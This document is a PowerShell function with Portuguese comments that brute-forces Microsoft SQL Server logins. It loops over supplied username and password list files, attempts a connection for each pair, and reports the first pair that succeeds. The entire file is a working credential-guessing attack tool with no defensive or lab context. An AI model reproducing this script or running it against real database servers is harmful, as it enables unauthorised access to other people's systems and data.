function Invoke-BruteMSSQL {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$h,  # Endereço e porta do servidor MSSQL (ex.: 10.160.89.19:1433)

        [Parameter(Mandatory=$true)]
        [string]$u,  # Caminho do arquivo com a lista de usuários

        [Parameter(Mandatory=$true)]
        [string]$p,  # Caminho do arquivo com a lista de senhas

        [Parameter(Mandatory=$true)]
        [string]$d   # Nome do banco de dados alvo
    )

    # Verifica se os arquivos fornecidos existem
    if (-not (Test-Path $u)) {
        Write-Error "O arquivo de usuários não foi encontrado: $u"
        return
    }
    if (-not (Test-Path $p)) {
        Write-Error "O arquivo de senhas não foi encontrado: $p"
        return
    }

    # Lê as credenciais dos arquivos
    $users = Get-Content $u
    $passwords = Get-Content $p

    # Itera sobre usuários e senhas
    foreach ($user in $users) {
        foreach ($password in $passwords) {
            try {
                Write-Host "Tentando ${user}:${password}..." -ForegroundColor Yellow
                # Conexão com o SQL Server usando o módulo System.Data.SqlClient
                $connectionString = "Server=$h;Database=$d;User Id=${user};Password=${password};"
                $sqlConnection = New-Object System.Data.SqlClient.SqlConnection
                $sqlConnection.ConnectionString = $connectionString
                $sqlConnection.Open()

                # Se a conexão for bem-sucedida, exibe sucesso e encerra o script
                Write-Host "SUCESSO! Credenciais: ${user}:${password}" -ForegroundColor Green
                $sqlConnection.Close()
                return
            } catch {
                # Ignora erros de conexão e continua
                Write-Host "Falha com ${user}:${password}" -ForegroundColor Red
            }
        }
    }

    Write-Host "Força bruta concluída sem sucesso." -ForegroundColor Cyan
}
